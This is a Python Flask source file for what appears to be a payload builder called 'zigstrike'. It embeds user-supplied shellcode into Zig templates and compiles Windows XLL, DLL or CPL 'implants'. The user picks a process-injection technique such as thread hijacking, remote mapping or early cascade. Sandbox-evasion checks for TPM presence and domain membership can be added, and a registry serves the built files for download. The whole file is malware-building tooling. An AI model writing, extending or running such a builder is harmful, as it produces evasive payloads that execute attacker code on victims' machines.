from flask import Flask, render_template, request, send_file, jsonify, after_this_request, redirect, url_for
import base64
import subprocess
import os
import re 
import math
import hashlib
import uuid
import time
from datetime import datetime

app = Flask(__name__, 
    static_url_path='/static',
    static_folder='static')
app.config['MAX_CONTENT_LENGTH'] = 32 * 1024 * 1024  # this will resolve the issue with docker env to handle large POST requests. 
app.config['IMPLANTS_DIR'] = 'implants'  # Directory to store implants
app.config['MAX_FORM_MEMORY_SIZE'] = 32 * 1024 * 1024   # this will resolve the issue with docker env to handle large POST requests. 
app.config['SHELLCODE_PARTS_DIR'] = '../src/shellcode_parts'  # Directory to store shellcode parts

# Ensure implants directory exists
if not os.path.exists(app.config['IMPLANTS_DIR']):
    os.makedirs(app.config['IMPLANTS_DIR'])

# Ensure shellcode_parts directory exists
if not os.path.exists(app.config['SHELLCODE_PARTS_DIR']):
    os.makedirs(app.config['SHELLCODE_PARTS_DIR'])

# Store compiled implants with metadata
implants_registry = {}

@app.before_request
def log_request_info():
    if request.method == 'POST':
        content_length = request.content_length
        print(f"Request Content-Length: {content_length / 1024:.2f} KB")
        print(f"Request Headers: {dict(request.headers)}")
        if 'content' in request.form:
            print(f"Content size in form: {len(request.form['content']) / 1024:.2f} KB")

@app.errorhandler(413) # have added this to log this error, it is probably related to the docker env. 
def request_entity_too_large(error):
    print(f"413 Error - Content Length: {request.content_length / 1024:.2f} KB")
    return jsonify({
        'error': 'Request too large',
        'content_length': request.content_length,
        'headers': dict(request.headers)
    }), 413

@app.errorhandler(400)
def bad_request(error):
    print(f"400 Error - Request data: {request.data}")
    print(f"400 Error - Form data: {request.form}")
    print(f"400 Error - Headers: {dict(request.headers)}")
    return jsonify({
        'error': 'Bad Request',
        'message': str(error),
        'request_data': str(request.data),
        'form_data': {k: f"{len(v)} chars" for k, v in request.form.items()} if request.form else "No form data"
    }), 400

def calculate_md5(file_path):
    """Calculate MD5 hash for a file"""
    md5 = hashlib.md5()
    with open(file_path, 'rb') as f:
        for chunk in iter(lambda: f.read(4096), b''):
            md5.update(chunk)
    return md5.hexdigest()

def split_base64_string(encoded_content, num_parts=15):
    """Split base64 string into optimized chunks while preserving all data"""
    total_length = len(encoded_content)
    # Calculate base chunk size, rounding up to ensure we don't lose data
    base_chunk_size = (total_length + num_parts - 1) // num_parts
    
    parts = []
    current_pos = 0
    
    while current_pos < total_length and len(parts) < num_parts:
        # For the last part, take all remaining content
        if len(parts) == num_parts - 1:
            chunk = encoded_content[current_pos:]
        else:
            chunk = encoded_content[current_pos:current_pos + base_chunk_size]
        parts.append(chunk)
        current_pos += len(chunk)
    
    # Pad with empty strings if needed
    while len(parts) < num_parts:
        parts.append("")
    
    return parts

def get_specific_code_block(file_path, block_identifier):
    if not os.path.exists(file_path):
        print(f"Error: File not found - {file_path}")
        return ""

    try:
        with open(file_path, 'r') as file:
            content = file.read()
           
            pattern = rf"// {block_identifier}\s*(.*?)\s*// END OF {block_identifier}"
            match = re.search(pattern, content, re.DOTALL | re.IGNORECASE)
            
            if match:
                extracted_block = match.group(1).strip()
            
                return extracted_block
            else:
                print(f"Warning: Block identifier '{block_identifier}' not found in {file_path}")
                return ""
    except Exception as e:
        print(f"Error reading file {file_path}: {str(e)}")
        return ""

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        # Initialize this variable outside the try block
        original_zig_code = ""
        
        try:
            # First read the original code before doing anything else
            with open('../src/main.zig', 'r') as f:
                original_zig_code = f.read()
                
            # Use .get() method to provide default values when fields are missing
            content = request.form['content']  # This is likely required
            extension = request.form['extension']  # This is likely required
            injection_method = request.form['injection_method']  # This is likely required
            
            # For optional checkboxes, use .get() with a default value
            enable_protection = request.form.get('protection_features', 'none')
            enable_additional_options = request.form.get('enable_additional_options', 'none')
            process_name = request.form.get('process_name', '')
            numbr_parts = int(request.form.get('num_shellcode_parts', '15'))

            
            xll_code = '';
            dll_code = '';
            cpl_code = '';

            cpl_wrapper = get_specific_code_block('../App/parts/ENTRY_CPL', 'CPL WRAPPER')
            
            try:
               
                encoded_content = base64.b64encode(content.encode()).decode()
                encoded_size = len(encoded_content)
                print(f"Encoded content size: {encoded_size}")
                shellcode_parts = split_base64_string(encoded_content, num_parts=numbr_parts)
                
                # Clean up old shellcode part files
                cleanup_shellcode_parts()

                # Write shellcode parts as binary files
                part_files = []
                for i, part in enumerate(shellcode_parts, 1):
                    part_file = os.path.join(app.config['SHELLCODE_PARTS_DIR'], f'part{i}.bin')
                    with open(part_file, 'wb') as f:
                        f.write(part.encode('utf-16-le'))  # Write the base64 content as binary
                    part_files.append(part_file)

                with open('../src/main.zig', 'r') as t:
                    zig_code = t.read()
                
                struct_content = "//START HERE\n"
                struct_content += "const SH = struct {\n"

                # For each part, embed the file as bytes and then convert to u16
                for i in range(1, numbr_parts + 1):
                    if i <= len(part_files):
                        # First embed the file (returns []const u8)
                        struct_content += f'    const b{i}_bytes = @embedFile("./shellcode_parts/part{i}.bin");\n'
                        # Then convert it to []const u16 with proper alignment handling
                        struct_content += f'    const b{i}: []const u16 = if (b{i}_bytes.len == 0) &[_]u16{{}} else @as([*]const u16, @ptrCast(@alignCast(&b{i}_bytes[0])))[0..b{i}_bytes.len/2];\n'
                    else:
                        struct_content += f'    const b{i}: []const u16 = &[_]u16{{}};\n'

                
                struct_content += f"\n    pub fn getshellcodeparts() [{numbr_parts}][]const u16 {{\n"
                struct_content += "        return .{\n"
                for i in range(1, numbr_parts + 1, 5):  # Group by 5 for readability
                    line_parts = []
                    for j in range(i, min(i + 5, numbr_parts + 1)):
                        line_parts.append(f"b{j}")
                    struct_content += "            " + ", ".join(line_parts) + ",\n"

                struct_content += "        };\n"
                struct_content += "    }\n"
                struct_content += "};\n"
                struct_content += "//END HERE\n"
                
                
                zig_code = re.sub(
                    r'//START HERE[\s\S]*?//END HERE',
                    struct_content,
                    zig_code
                )
                
                
                if injection_method == 'hijack_thread' and extension == 'xll':
                    xll_code = get_specific_code_block('../App/parts/ENTRY_XLL', 'HIJACK THREAD INJECTION')
                elif injection_method == 'local_mapping' and extension == 'xll':  # local_mapping
                    xll_code = get_specific_code_block('../App/parts/ENTRY_XLL', 'LOCAL MAPPING INJECTION ')
                elif injection_method == 'remote_mapping' and extension == 'xll':
                    xll_code = get_specific_code_block('../App/parts/ENTRY_XLL', 'REMOTE MAPPING INJECTION')
                elif injection_method == 'remote_thread' and extension == 'xll':
                    xll_code = get_specific_code_block('../App/parts/ENTRY_XLL', 'HIJACK REMOTE THREAD INJECTION')
                elif injection_method == 'early_cascade' and extension == 'xll':
                    xll_code = get_specific_code_block('../App/parts/ENTRY_XLL', 'EARLY CASCADE INJECTION')
                    #xll_code = xll_code.replace('// PROCESS NAME', process_name)
                #  if xll_code != '':
                #      zig_code = zig_code.replace('// ENTRY_XLL', xll_code)

                if injection_method == 'local_mapping' and extension == 'dll':
                    dll_code = get_specific_code_block('../App/parts/ENTRY_DLL', 'LOCAL MAPPING INJECTION')
                elif injection_method  == 'hijack_thread' and extension == 'dll':
                    dll_code = get_specific_code_block('../App/parts/ENTRY_DLL', 'HIJACK THREAD INJECTION')
                elif injection_method == 'remote_mapping' and extension == 'dll':
                    dll_code = get_specific_code_block('../App/parts/ENTRY_DLL', 'REMOTE MAPPING INJECTION')
                    #dll_code = dll_code.replace('// PROCESS NAME ', process_name)
                elif injection_method == 'remote_thread' and extension == 'dll':
                    dll_code = get_specific_code_block('../App/parts/ENTRY_DLL', 'HIJACK REMOTE THREAD INJECTION')
                elif injection_method == 'early_cascade' and extension == 'dll':
                    dll_code = get_specific_code_block('../App/parts/ENTRY_DLL', 'EARLY CASCADE INJECTION')
                    #dll_code = dll_code.replace('// PROCESS NAME', process_name)
                elif injection_method == 'local_mapping' and extension == 'cpl':
                    cpl_code = get_specific_code_block('../App/parts/ENTRY_CPL', 'LOCAL MAPPING INJECTION')
                elif injection_method == 'hijack_thread' and extension == 'cpl':
                    cpl_code = get_specific_code_block('../App/parts/ENTRY_CPL', 'HIJACK THREAD INJECTION')
                elif injection_method == 'remote_mapping' and extension == 'cpl':
                    cpl_code = get_specific_code_block('../App/parts/ENTRY_CPL', 'REMOTE MAPPING INJECTION')
                elif injection_method == 'remote_thread' and extension == 'cpl':
                    cpl_code = get_specific_code_block('../App/parts/ENTRY_CPL', 'REMOTE THREAD INJECTION')
                elif injection_method == 'early_cascade' and extension == 'cpl':
                    cpl_code = get_specific_code_block('../App/parts/ENTRY_CPL', 'EARLY CASCADE INJECTION')
                
                if cpl_code != '':
                    zig_code = zig_code.replace('// ENTRY_CPL', cpl_code)
                    zig_code = zig_code.replace('// CPL_WRAPPER', cpl_wrapper) # this will add the cpl wrapper to the code
                if dll_code != '':
                    zig_code = zig_code.replace('// ENTRY_DLL', dll_code)
                if xll_code != '':
                    zig_code = zig_code.replace('// ENTRY_XLL', xll_code)
                
                if enable_protection == 'tpm_check':
                    zig_code = zig_code.replace('// Sandbox protection option enabled?', 'if (!core.checkTPMPresence()) {\n            std.debug.print("sandbox detected \\n", .{});\n    return 0;\n}')

                if enable_protection == 'domain_check':
                    zig_code = zig_code.replace('// Sandbox protection option enabled?', 'if (!core.checkDomainStatus()) {\n           std.debug.print("sandbox detected \\n", .{});\n      return 0;\n}')
                if enable_additional_options == 'runtime_protection':
                    zig_code = zig_code.replace('// enable runtime protection', 'const result = xll_core.ShowCheckboxDialog(); \n       if (result == false) {\n    std.debug.print("runtime protection enabled \\n", .{});\n     return 0;\n }')

                if process_name != '':
                    zig_code = zig_code.replace('// PROCESS NAME ', process_name)
                # Write the modified code back to main.zig
                with open('../src/main.zig', 'w') as f:
                    f.write(zig_code)
                
                with open('../src/temp.txt', 'w') as f:
                    f.write(zig_code)
                
                
                result = subprocess.run(['zig', 'build', '-Dtarget=x86_64-windows-gnu'], capture_output=True, text=True)
                
            finally:
                # this will fix the issue when same time same file is being compiled.  
                with open('../src/main.zig', 'w') as f:
                    f.write(original_zig_code)
                print("Restored original Zig code")
            
            
            
            if extension == 'xll':
                os.rename('../zig-out/bin/ZS.dll', '../zig-out/bin/output.xll' )
            elif extension == 'dll':
                os.rename('../zig-out/bin/ZS.dll', '../zig-out/bin/output.dll')
            elif extension == 'cpl':
                os.rename('../zig-out/bin/ZS.dll', '../zig-out/bin/output.cpl')

            
            output_dir = '../zig-out/bin'
            print(f"Checking output directory: {output_dir}")

            try:
                output_files = os.listdir(output_dir)
                print(f"Files in output directory: {output_files}")
            except Exception as e:
                print(f"Error listing output directory: {str(e)}")
                return jsonify({'error': 'Failed to list output directory', 'details': str(e)}), 500

            compiled_file = next((f for f in output_files if f.endswith(extension)), None)

            if compiled_file:
                output_path = os.path.join(output_dir, compiled_file)
                print(f"Found compiled file: {output_path}")
                
                # Generate a unique ID for this implant
                implant_id = str(uuid.uuid4())
                
                # Copy the file to the implants directory
                implant_filename = f"{implant_id}.{extension}"
                implant_path = os.path.join(app.config['IMPLANTS_DIR'], implant_filename)
                
                with open(output_path, 'rb') as src, open(implant_path, 'wb') as dst:
                    dst.write(src.read())
                
                # Calculate MD5 checksum
                md5_hash = calculate_md5(implant_path)
                
                # Get file size
                file_size = os.path.getsize(implant_path)
                
                # Add to implants registry
                implants_registry[implant_id] = {
                    'id': implant_id,
                    'filename': f"zigstrike_{injection_method}.{extension}",
                    'path': implant_path,
                    'type': extension,
                    'technique': injection_method,
                    'md5': md5_hash,
                    'size': file_size,
                    'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    'protection': enable_protection if enable_protection != 'none' else 'None',
                    'runtime_protection': enable_additional_options == 'runtime_protection',
                    'process_target': process_name if process_name else 'None'
                }
                
                # Cleanup original compiled file
                try:
                    if os.path.exists(output_path):
                        os.remove(output_path)
                        print(f"Deleted original compiled file: {output_path}")
                except Exception as e:
                    print(f"Error during cleanup: {str(e)}")
                
                
                cleanup_shellcode_parts() #clean up the shellcode parts
                return redirect(url_for('implants_page'))
                
            else:
                print(f"No file found with extension: {extension}")
                return jsonify({'error': 'Compilation succeeded but file not found'}), 500
        except Exception as e:
            
            try:
                with open('../src/main.zig', 'w') as f:
                    f.write(original_zig_code)
                print("Restored original Zig code after error")
            except Exception as restore_error:
                print(f"Error restoring original code: {str(restore_error)}")
            
            return jsonify({'error': str(e)}), 500
    
    return render_template('index.html')

@app.route('/implants')
def implants_page():
    return render_template('implants.html', implants=implants_registry)

@app.route('/download/<implant_id>')
def download_implant(implant_id):
    if implant_id in implants_registry:
        implant = implants_registry[implant_id]
        return send_file(
            implant['path'],
            as_attachment=True,
            download_name=implant['filename'],
            mimetype='application/x-msdownload'
        )
    else:
        return jsonify({'error': 'Implant not found'}), 404

@app.route('/delete/<implant_id>')
def delete_implant(implant_id):
    if implant_id in implants_registry:
        implant = implants_registry[implant_id]
        
        # Delete the file
        try:
            if os.path.exists(implant['path']):
                os.remove(implant['path'])
        except Exception as e:
            print(f"Error deleting file: {str(e)}")
        
        # Remove from registry
        del implants_registry[implant_id]
        
        return redirect(url_for('implants_page'))
    else:
        return jsonify({'error': 'Implant not found'}), 404

@app.route('/api/implants-count')
def get_implants_count():
    return jsonify({
        'count': len(implants_registry)
    })

# Add this function to clean up old shellcode parts
def cleanup_shellcode_parts():
    """Clean up old shellcode part files from previous runs"""
    if os.path.exists(app.config['SHELLCODE_PARTS_DIR']):
        for file in os.listdir(app.config['SHELLCODE_PARTS_DIR']):
            try:
                os.remove(os.path.join(app.config['SHELLCODE_PARTS_DIR'], file))
            except Exception as e:
                print(f"Error removing old shellcode part {file}: {str(e)}")

if __name__ == '__main__':
    
    app.run(debug=True,host='0.0.0.0',port=5002)
